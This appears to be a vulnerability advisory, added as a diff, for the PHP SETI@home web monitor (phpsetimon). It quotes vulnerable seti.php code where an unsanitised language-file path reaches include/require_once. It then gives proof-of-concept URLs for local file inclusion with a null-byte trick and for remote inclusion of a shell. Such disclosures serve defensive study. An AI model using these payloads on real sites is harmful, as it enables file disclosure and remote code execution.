@@ -1,0 +1,53 @@
+===========================================================================
+PHP SETI@home web monitor (phpsetimon) RFI / LFI Vulnerability
+===========================================================================
+
+Home Page:	http://setiathome.ssl.berkeley.edu/
+download:	http://www.mariovaldez.net/software/phpsetimon/
+Author:		eidelweiss
+Contact:	g1xsystem[at]windowslive.com
+
+=====================================================================
+
+Description:
+
+The PHP SETI@home web monitor is a very simple PHP script to monitor single or multiple setiathome programs running in your workstation or server, via the local web server. 
+If you don't know what is SETI@home, visit the SETI@home website. 
+
+=====================================================================
+
+	--=[ Vuln C0de ]=-
+
+[-] path/seti.php
+
+-----------------------------------------------------------------------------------------
+
+require_once ("seticlients.inc.php");
+require_once ("config.inc.php");
+
+$ps_charset = "iso-8859-1";
+if ($ps_cfg_language <> "")
+  $ps_htmllang = "<meta http-equiv='Content-Type' content='text/html; charset=$ps_charset'>\n";
+$ps_languages = array ("es" => 1, "en" => 1);
+if (array_key_exists (strtolower ($ps_cfg_language), $ps_languages)) {
+  $ps_cfg_language = strtolower ($ps_cfg_language);
+  require_once ($ps_cfg_langfiles . $ps_cfg_language. ".inc.php");
+}
+else { $ps_cfg_language = "en"; include($ps_cfg_langfiles . "en.inc.php"); }
+
+require_once ("seti_lib.inc.php");
+require_once ("seti_data.inc.php");
+require_once ("seti_graphs.inc.php");
+
+-----------------------------------------------------------------------------------------
+
+	-=[ P0C LFI ]=-
+
+	http://127.0.0.1/path/seti.php?ps_cfg_langfiles= [LFI]%00
+			
+	-=[ P0C RFI ]=-
+
+	http://127.0.0.1/path/seti.php?ps_cfg_langfiles= [inj3ct0r sh3ll]
+
+
+=========================| -=[ E0F ]=- |=========================
